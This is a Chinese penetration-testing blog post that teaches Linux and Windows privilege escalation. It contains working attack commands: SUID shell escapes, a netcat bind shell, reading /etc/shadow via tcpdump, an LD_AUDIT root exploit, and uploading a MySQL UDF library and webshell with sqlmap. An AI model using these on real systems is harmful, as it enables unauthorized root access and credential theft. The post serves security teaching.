<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="渗透测试," />





  <link rel="alternate" href="/atom.xml" title="Hello_C技术博客" type="application/atom+xml" />






<meta name="description" content="0x01 信息搜集Linux

LinEnum　　LinEnum可以列举系统设置并且高度总结的linux本地枚举和权限提升检测脚本。隐私访问：判断当前用户是否能够用空口令使用sudo命令,root用户的家目录能否访问。系统信息：主机名，网络详情，当前IP等等。用户信息：当前用户，列出所有包含uid/gid的用户信息，列出有root权限的用户，检查密码hash是否保存在/etc/passwd。">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透测试-03权限提升与内网渗透">
<meta property="og:url" content="http://yoursite.com/渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html">
<meta property="og:site_name" content="Hello_C技术博客">
<meta property="og:description" content="0x01 信息搜集Linux

LinEnum　　LinEnum可以列举系统设置并且高度总结的linux本地枚举和权限提升检测脚本。隐私访问：判断当前用户是否能够用空口令使用sudo命令,root用户的家目录能否访问。系统信息：主机名，网络详情，当前IP等等。用户信息：当前用户，列出所有包含uid/gid的用户信息，列出有root权限的用户，检查密码hash是否保存在/etc/passwd。">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-10-23/11319169.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-10-23/88618768.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-10-23/44476752.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-10-23/84300850.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-10-23/67634331.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-10-23/86649904.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227100917958.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227101504916.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/66666.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-10-23/12917243.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-27/38304352.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-27/75770663.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-27/43478958.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-27/45878154.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-27/40345247.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-27/42042343.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-27/36229232.jpg">
<meta property="og:image" content="http://www.4hou.com/uploads/20171222/1513957265171473.png">
<meta property="og:image" content="http://www.4hou.com/uploads/20171222/1513957702873643.png">
<meta property="og:image" content="http://www.4hou.com/uploads/20171222/1513957762448685.png">
<meta property="og:image" content="http://www.4hou.com/uploads/20171222/1513958141771531.png">
<meta property="og:image" content="http://www.4hou.com/uploads/20171222/1513958195485836.png">
<meta property="og:image" content="http://www.4hou.com/uploads/20171222/1513958230587933.png">
<meta property="og:image" content="http://www.4hou.com/uploads/20171222/1513958348323279.png">
<meta property="og:image" content="http://www.4hou.com/uploads/20171222/1513958384790590.png">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-25/18787600.jpg">
<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-12-25/61508929.jpg">
<meta property="og:image" content="http://www.secist.com/wp-content/uploads/2016/08/20160813085602.png">
<meta property="og:updated_time" content="2018-01-03T13:41:00.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="渗透测试-03权限提升与内网渗透">
<meta name="twitter:description" content="0x01 信息搜集Linux

LinEnum　　LinEnum可以列举系统设置并且高度总结的linux本地枚举和权限提升检测脚本。隐私访问：判断当前用户是否能够用空口令使用sudo命令,root用户的家目录能否访问。系统信息：主机名，网络详情，当前IP等等。用户信息：当前用户，列出所有包含uid/gid的用户信息，列出有root权限的用户，检查密码hash是否保存在/etc/passwd。">
<meta name="twitter:image" content="http://obh1qcqek.bkt.clouddn.com/17-10-23/11319169.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html"/>





  <title>渗透测试-03权限提升与内网渗透 | Hello_C技术博客</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hello_C技术博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">一个小白的独白！</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Hello_C">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hello_C技术博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">渗透测试-03权限提升与内网渗透</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-28T10:53:13+08:00">
                2017-12-28
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透/" itemprop="url" rel="index">
                    <span itemprop="name">渗透</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html#comments" itemprop="discussionUrl">
                  <span class="post-comments-count ds-thread-count" data-thread-key="渗透/2017/12/28/渗透测试-03权限提升与内网渗透.html" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h3 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h3><p><strong>Linux</strong></p>
<ul>
<li>LinEnum<br>　　<a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">LinEnum</a>可以列举系统设置并且高度总结的linux本地枚举和权限提升检测脚本。<br>隐私访问：判断当前用户是否能够用空口令使用sudo命令,root用户的家目录能否访问。<br>系统信息：主机名，网络详情，当前IP等等。<br>用户信息：当前用户，列出所有包含uid/gid的用户信息，列出有root权限的用户，检查密码hash是否保存在/etc/passwd。<a id="more"></a><br>内核和发行版详细信息<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/11319169.jpg" alt=""></li>
<li>Linuxprivchecker<br>　　<a href="http://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="external">Linuxprivchecker</a>枚举系统设置和执行一些提升权限的检查。它由python实现，用来对被控制的系统提供建议的exploits。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/88618768.jpg" alt=""></li>
<li>Linux Exploit Suggester<br>　　<a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester" target="_blank" rel="external">Linux Exploit Suggester</a>它基于操作系统的内核版本号。这个程序会执行“uname -r”来得到系统内核版本号。然后返回一个包含了可能exploits的列表。另外它还可以使用“-k”参数手工指定内核版本。<br>　　如果你知道内核版本号就可以在终端中直接使用下列命令：<strong>./Linux_Exploit_Suggester.pl -k 3.5</strong>如果不知道就输入<strong>./Linux_Exploit_Suggester.pl uname –r</strong>来获得内核版本号然后使用上面的命令并把版本号替换成你自己的。然后它就会给出建议的exploits列表。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/44476752.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/84300850.jpg" alt=""></li>
<li>Unix-Privesc-checker<br>　　<a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="external">Unix-Privesc-checker</a>在UNIX系统上检测权限提升向量的shell脚本。它可以在UNIX和Linux系统上运行。寻找那些错误的配置可以用来允许未授权用户提升对其他用户或者本地应用的权限。<br>unix-privesc-check standard<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/67634331.jpg" alt=""><br>unix-privesc-check detailed<br><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/86649904.jpg" alt=""></li>
<li>Linux_Exploit_Suggester<br>　　<a href="https://github.com/sammbertram/Linux_Exploit_Suggester" target="_blank" rel="external">Linux_Exploit_Suggester</a></li>
</ul>
<p><strong>Windows</strong></p>
<ul>
<li>Windows-Exploit-Suggester<br>　　在目标机器中执行<strong>systeminfo</strong>，并保存为文本文件，Windows-Exploit-Suggester中所有的文件和内容<br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227100917958.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/360%E6%88%AA%E5%9B%BE20170227101504916.jpg" alt=""><br>　　执行<strong>python windows-exploit-suggester.py –database 2017-02-27-mssb.xls –systeminfo 12.txt</strong> ，参数<strong>–database</strong>，指定数据库位置(就是那个excel文件)，参数<strong>–systeminfo</strong>，指定目标信息的文件。它会显示所有可能的漏洞的操作系统受害者Windows PC<br><img src="http://obh1qcqek.bkt.clouddn.com/66666.jpg" alt=""><br>或者在线检测：<br><a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="external">https://bugs.hacking8.com/tiquan/</a><br>exp查找网址：<br><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">https://github.com/SecWiki/windows-kernel-exploits</a><br><a href="https://www.exploit-db.com/" target="_blank" rel="external">https://www.exploit-db.com/</a></li>
<li>BeRoot<br>　　<a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="external">BeRoot</a>是一款Post-Exploitation工具，也就是在黑客拿到目标主机的Shell之后所要用到的一种东西。BeRoot可以帮助我们检查目标Windows系统中存在的错误配置，并找出提权的方法。</li>
<li>常用命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">systeminfo | findstr OS #获取系统版本信息</div><div class="line">hostname	#获取主机名称</div><div class="line">whomai /priv	#显示当前用户的安全特权</div><div class="line">quser or query user	#获取在线用户</div><div class="line">netstat -ano | findstr 3389	#获取rdp连接来源IP</div><div class="line">dir c:\programdata\ #分析安装杀软</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn	#列出已安装的补丁</div><div class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber	#获取远程端口</div><div class="line">tasklist /svc | find &quot;TermService&quot; + netstat -ano	#获取远程端口</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x02-提权方法"><a href="#0x02-提权方法" class="headerlink" title="0x02 提权方法"></a>0x02 提权方法</h3><p><strong>Linux</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">常规思路：</div><div class="line">1、检查漏洞系统的操作系统发行版</div><div class="line">2、查看内核版本</div><div class="line">3、检查可用的用户及当前用户的权限</div><div class="line">4、列出SUID文件（常见的Linux错误配置）</div><div class="line">5、查看安装的包、程序、运行的服务，过时的版本可能存在漏洞。</div></pre></td></tr></table></figure></p>
<ul>
<li>利用Linux内核漏洞提权<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lsb_release -a  查看系统的发行版本</div><div class="line">uname -a  查看内核版本</div><div class="line">也可以使用我们前面讲的那几个工具进行信息搜集</div></pre></td></tr></table></figure>
</li>
</ul>
<p>　　查找EXP可以利用前面Linux_Exploit_Suggester.pl脚本或者kali自带的searchsploit来搜索exploitdb中的漏洞利用代码,或者<a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="external">SecWiki的github</a>也有整理。<br>　　我们首先移动到/tmp目录，然后新建一个文件，粘贴exploit代码进去依次运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ cd /tmp</div><div class="line">$ touch exploit.c</div><div class="line">$ vim exploit.c</div></pre></td></tr></table></figure></p>
<p>　　vim保存退出后，我们编译执行代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ gcc exploit.c -o exploit</div><div class="line">$　chomd 777 ./exploit</div><div class="line">$ ./exploit</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-10-23/12917243.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">通过截图可以看到我们已经获取到了root权限，接下来获取交互式的shell</div><div class="line">$ python -c ‘import pty; pty.spawn(“/bin/bash”)’</div></pre></td></tr></table></figure>
<ul>
<li>利用低权限用户目录下可被Root权限用户调用的脚本提权<br>如果设置了SUID这个标志位，普通权限的程序在执行的时候，可以暂时拥有root权限。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</div><div class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; </div><div class="line">find / -perm -u=s -type f 2&gt;/dev/null （使用这个最多）</div><div class="line">find –perm mode        #根据文件的权限来查找文件</div><div class="line">-u=s                   #查找s权限使一般使用者临时具有该文件所属主/组的执行权限</div><div class="line">-type  b/d/c/p/l/f     #查是块设备、目录、字符设备、管道、符号链接、普通文件</div><div class="line">“2&gt; /dev/null”         #代表忽略掉错误提示信息。</div><div class="line"></div><div class="line">可以用来提权的可执行文件有：</div><div class="line">Nmap 2.02到5.21</div><div class="line">Vim</div><div class="line">find</div><div class="line">Bash</div><div class="line">More</div><div class="line">Less</div><div class="line">Nano</div><div class="line">cp</div></pre></td></tr></table></figure>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/38304352.jpg" alt=""><br>nmap<br>老版本的nmap（2.02-5.21）有 interactive，是允许用户执行系统命令的。提权方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nmap --interactive</div><div class="line">nmap&gt; !sh</div><div class="line">sh-3.2# whoami</div><div class="line">root</div><div class="line"></div><div class="line">msf模块为：exploit/unix/local/setuid_nmap</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/75770663.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/43478958.jpg" alt=""><br>Find<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">touch test</div><div class="line">find test -exec whoami \;</div></pre></td></tr></table></figure></p>
<p>如果服务器上装了nc，可以直接使用以下命令进行监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">find test -exec netcat -lvp 5555 -e /bin/sh \;</div><div class="line">之后进行连接：</div><div class="line">netcat 192.168.1.100 5555</div><div class="line">则可获取root shell</div></pre></td></tr></table></figure></p>
<p>vim/vi<br>打开vim,按下ESC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">:set shell=/bin/sh</div><div class="line">:shell</div><div class="line"></div><div class="line">即可执行命令</div></pre></td></tr></table></figure></p>
<p>bash<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bash -p</div><div class="line">bash-3.2# id</div><div class="line">uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</div></pre></td></tr></table></figure></p>
<p>less<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">less /etc/passwd</div><div class="line">!/bin/sh</div></pre></td></tr></table></figure></p>
<p>more<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">more /home/pelle/myfile</div><div class="line">!/bin/bash</div></pre></td></tr></table></figure></p>
<p>cp<br>使用cp覆盖 /etc/shadow<br>mv<br>使用mv 覆盖 /etc/shadow 或者/etc/sudoers<br>awk<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</div></pre></td></tr></table></figure></p>
<p>man<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">man passwd</div><div class="line">!/bin/bash</div></pre></td></tr></table></figure></p>
<p>python/perl/ruby/lua/etc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">perl</div><div class="line">exec &quot;/bin/bash&quot;;</div><div class="line"></div><div class="line">python</div><div class="line">import os</div><div class="line">os.system(&quot;/bin/bash&quot;)</div></pre></td></tr></table></figure></p>
<p>tcpdump<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo $&apos;id\ncat /etc/shadow&apos; &gt; /tmp/.test</div><div class="line">chmod +x /tmp/.test</div><div class="line">sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</div></pre></td></tr></table></figure></p>
<p>利用tmp目录权限、suid 权限和C语言使普通帐号提权为ROOT权限，RHEL5-RHEL6下面都可以实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">[root@ahu ~]# useradd test</div><div class="line">[root@ahu ~]# passwd test</div><div class="line">New password: </div><div class="line">Retype new password:</div><div class="line">passwd: all authentication tokens updated successfully.</div><div class="line"></div><div class="line">[root@ahu ~]# su - test</div><div class="line">[test@ahu ~]$ whoami </div><div class="line">test                            //登陆到普通用户，发现创建不了其他用户</div><div class="line">[test@ahu ~]$ useradd aaa</div><div class="line">-bash: /usr/sbin/useradd: Permission denied</div><div class="line"></div><div class="line">进行身份变换</div><div class="line">[test@ahu ~]$ mkdir /tmp/exploit</div><div class="line">[test@ahu ~]$ ln /bin/ping /tmp/exploit/target</div><div class="line">[test@ahu exploit]$  exec 3&lt; /tmp/exploit/target</div><div class="line">[test@ahu exploit]$ ls -l /proc/$$/fd/3</div><div class="line">lr-x------ 1 test test 64 Aug 17 21:41 /proc/35612/fd/3 -&gt; /tmp/exploit/target</div><div class="line">[test@ahu exploit]$ rm -rf /tmp/exploit/</div><div class="line">[test@ahu exploit]$ ls -l /proc/$$/fd/3</div><div class="line">[test@ahu ~]$ vim payload.c </div><div class="line">void __attribute__((constructor)) init()     //在配置文件加入如下的内容</div><div class="line">&#123;</div><div class="line">    setuid(0);</div><div class="line">    system(&quot;/bin/bash&quot;);</div><div class="line">&#125;</div><div class="line">~           </div><div class="line">[test@ahu ~]$ gcc -w -fPIC -shared -o /tmp/exploit payload.c</div><div class="line">[test@ahu ~]$ ls -l /tmp/exploit</div><div class="line">[test@ahu ~]$ LD_AUDIT=&quot;$ORIGIN&quot; exec /proc/self/fd/3</div><div class="line">Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]</div><div class="line">            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]</div><div class="line">            [-M mtu discovery hint] [-S sndbuf]</div><div class="line">            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination</div><div class="line">[root@ahu ~]# whoami </div><div class="line">root</div><div class="line">发现身份变成了 root用户。身份变换成功！</div><div class="line">exploits:https://www.exploit-db.com/exploits/15274/</div></pre></td></tr></table></figure></p>
<ul>
<li><p>利用环境变量劫持高权限程序提权<br>　　我们当前登录的是”Kane”账号，当前没有有效的内核exploit，也没有其他可以利用的suid文件，只有在Kane的home目录下有一个“msgmike.”文件 ，使用file命令查看下这个文件 ，这是一个ELF 32位 LSB执行文件，但是当我们执行文件的时候，报错了<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/45878154.jpg" alt=""><br>　　通过报错信息我们可以看到msgmike调用cat命令读取/home/mike/msg.txt文件。针对这种情况，我们可以通过设置bash的$path环境变量来利用，通常的$PATH包含<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/40345247.jpg" alt=""><br>　　然而当我们调用cat命令的时候，cat会从以上目录来寻找，如果我们添加.到$PATH环境变量，则会先从当前目录来寻找cat指令，新建cat,添加执行权限<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/42042343.jpg" alt=""><br>　　这样当我们再次运行./msgmike命令的时候，就会触发当前目录下的cat(/bin/sh)，从而提权。完整的exploit如下<br><img src="http://obh1qcqek.bkt.clouddn.com/17-12-27/36229232.jpg" alt=""></p>
</li>
<li><p>MySQL连接用户为root<br>利用mysql提权</p>
</li>
</ul>
<p>1、找到MySQL插件目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</div><div class="line">show variables like &quot;%plugin%&quot;;</div></pre></td></tr></table></figure></p>
<p>2、利用sqlmap上传 lib_mysqludf_sys到MySQL插件目录;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &apos;http://xxxx&apos; --file-write=/lib_mysqludf_sys.so</div><div class="line">--file-dest=/usr/lib/mysql/plugin/</div></pre></td></tr></table></figure></p>
<p>3、激活存储过程「sys_exec」函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &apos;http://xxxx&apos; --sql-shell</div><div class="line">CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so</div><div class="line">SELECT * FROM information_schema.routines</div><div class="line">sys_exec(id);</div></pre></td></tr></table></figure></p>
<p>也利用sqlmap上传后门程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u &apos;http://xxx&apos;  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php</div><div class="line"></div><div class="line">https://github.com/mysqludf/lib_mysqludf_sys</div><div class="line">https://code.google.com/p/mysql-udf-http/</div></pre></td></tr></table></figure>
<ul>
<li>利用动态链接共享对象库进行Linux提权<br>　　Linux中的动态链接共享对象库(dynamically linked shared object libraries)有点像Windows的DLL文件，与Windows中的DLL植入攻击类似，可以利用弱文件权限的共享库执行任意代码，进行Linux提权。<br><strong>OS怎样找到共享库?</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">当使用共享库的应用运行时，操作系统就会以下面的顺序寻找库：</div><div class="line">1. rpath-link选项中指定的目录；</div><div class="line">2. –rpath选项中指定的目录；</div><div class="line">3. LD_RUN_PATH；</div><div class="line">4. LD_LIBRARY_PATH；</div><div class="line">5. DT_RUNPATH或DT_RPATH中的目录；</div><div class="line">6. /lib and /usr/lib；</div><div class="line">7. /etc/ld.so.conf下的目录。</div></pre></td></tr></table></figure>
</li>
</ul>
